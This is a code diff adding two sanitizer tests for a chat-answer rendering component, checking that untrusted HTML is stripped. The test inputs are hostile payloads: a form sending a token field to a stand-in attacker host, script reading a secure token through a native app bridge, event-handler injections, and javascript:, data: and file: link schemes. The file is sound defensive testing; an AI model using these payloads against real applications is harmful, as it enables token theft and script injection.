@@ -53,3 +53,26 @@ test("citation pills still render inside a callout body", () => {
 
   expect(container.querySelector("blockquote.callout sup.cite")).not.toBeNull();
 });
+
+test("untrusted answer HTML cannot embed documents or inject native-bridge script", () => {
+  const content = `<iframe srcdoc="<script>window.Capacitor</script>"></iframe>
+<form action="https://attacker.invalid"><input name="token"><button>submit</button></form>
+<object data="data:text/html,evil"></object><embed src="https://attacker.invalid">
+<script>window.Capacitor.Plugins.SecureToken.get()</script><svg onload="alert(1)"></svg>
+<p onclick="alert(1)" style="position:fixed" class="app-shell">仍可阅读的正文</p>`;
+  const { container } = render(<RenderedAnswer content={content} sources={[]} />);
+  expect(container.querySelector("iframe,form,input,button,object,embed,script,svg")).toBeNull();
+  expect(container.querySelector("[onclick],[onload],[style]")).toBeNull();
+  expect(container.querySelector(".app-shell")).toBeNull();
+  expect(screen.getByText("仍可阅读的正文")).toBeInTheDocument();
+});
+
+test("sanitized answers keep GFM tables and safe links while rejecting executable URL schemes", () => {
+  const content = `| 课程 | 学分 |\n| --- | --- |\n| 测试课程 | 2 |\n\n
+<a href="javascript:alert(1)">unsafe</a><a href="data:text/html,evil">data</a>
+<a href="file:///private/token">file</a><a href="https://jw.ustc.edu.cn/">教务</a>`;
+  const { container } = render(<RenderedAnswer content={content} sources={[]} />);
+  expect(container.querySelector("table td")?.textContent).toBe("测试课程");
+  expect(screen.getByRole("link", { name: "教务" }).getAttribute("href")).toBe("https://jw.ustc.edu.cn/");
+  expect([...container.querySelectorAll("a[href]")].map((node) => node.getAttribute("href"))).toEqual(["https://jw.ustc.edu.cn/"]);
+});
